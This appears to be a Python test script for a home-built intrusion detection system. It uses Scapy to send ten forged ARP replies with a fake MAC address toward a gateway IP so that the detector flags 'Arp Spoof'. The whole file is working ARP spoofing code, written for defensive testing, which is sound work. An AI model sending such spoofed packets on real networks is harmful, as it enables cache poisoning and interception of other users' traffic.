#!/usr/bin/env python3
"""
ARP Spoofing Attack Simulation
Sends spoofed ARP packets to trigger ARP spoofing detection.

Pattern: ARP packets from fake source
Expected Detection: 'Arp Spoof'
Expected Action: RED (DROP) or ORANGE (ALERT)
"""

import sys
import time
from scapy.all import ARP, send, conf

# Configure Scapy
conf.verb = 0

def print_header():
    print("\n" + "="*70)
    print("  🔴 ARP SPOOFING ATTACK SIMULATION")
    print("="*70)
    print("\n📋 Attack Details:")
    print("  • Type: ARP Spoofing (Man-in-the-Middle)")
    print("  • Method: Fraudulent ARP responses")
    print("  • Detection: ARP protocol analysis")
    print("  • Expected: Attack Type = 'Arp Spoof'")
    print("  • Action: 🔴 RED (DROP) or 🟠 ORANGE (ALERT)\n")

def attack_arp_spoof():
    """Simulate ARP Spoofing."""
    target_ip = "192.168.1.1"  # Gateway
    fake_source_ip = "192.168.1.100"  # Attacker pretends to be this IP
    fake_mac = "00:11:22:33:44:55"  # Fake MAC
    
    print(f"Target IP: {target_ip}")
    print(f"Fake Source IP: {fake_source_ip}")
    print(f"Fake MAC: {fake_mac}")
    print(f"\nSending 10 spoofed ARP packets...\n")
    
    start_time = time.time()
    
    for i in range(10):
        # ARP spoofing: pretend to be the fake source IP
        pkt = ARP(
            op="is-at",           # ARP reply
            pdst=target_ip,       # Target IP
            psrc=fake_source_ip,  # Fake source IP
            hwsrc=fake_mac        # Fake MAC address
        )
        
        try:
            send(pkt, verbose=False)
            elapsed = time.time() - start_time
            print(f"  [{i+1:2d}/10] ARP spoofed packet sent (elapsed: {elapsed:.2f}s)")
        except Exception as e:
            print(f"  ❌ Error sending ARP packet {i+1}: {e}")
            return False
        
        time.sleep(0.1)  # 100ms between packets
    
    elapsed = time.time() - start_time
    print(f"\n✅ ARP spoofing complete in {elapsed:.2f}s")
    print(f"\n📊 Statistics:")
    print(f"  • Packets sent: 10")
    print(f"  • Duration: {elapsed:.2f}s")
    print(f"  • Rate: {10/elapsed:.1f} packets/sec")
    print(f"  • Attack pattern: ARP protocol spoofing")
    return True

def main():
    print_header()
    
    print("⚠️  Setup Required:")
    print("  1. Start the GUI with 'python3 ids/gui/capture_gui.py'")
    print("  2. Click 'Start Capture' and select 'lo' interface")
    print("  3. Watch the 'Detections' tab for alerts\n")
    
    try:
        input("Press Enter to start ARP Spoofing attack...")
        success = attack_arp_spoof()
        
        if success:
            print("\n✅ Check GUI for 'Arp Spoof' detection!")
            print("\n💡 What you should see:")
            print("  • In 'Detections' tab: Attack Type = 'Arp Spoof'")
            print("  • Color: 🔴 RED or 🟠 ORANGE")
            print("  • Protocol: ARP")
            print("  • Spoofed IP: 192.168.1.100")
        else:
            print("\n❌ Attack simulation failed")
            sys.exit(1)
    
    except PermissionError:
        print("\n❌ ERROR: This script needs sudo to send packets!")
        print("\nRun with:")
        print("  sudo /home/yaya/Documents/IDS/ids_venv/bin/python attack_arp_spoof.py")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ ERROR: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
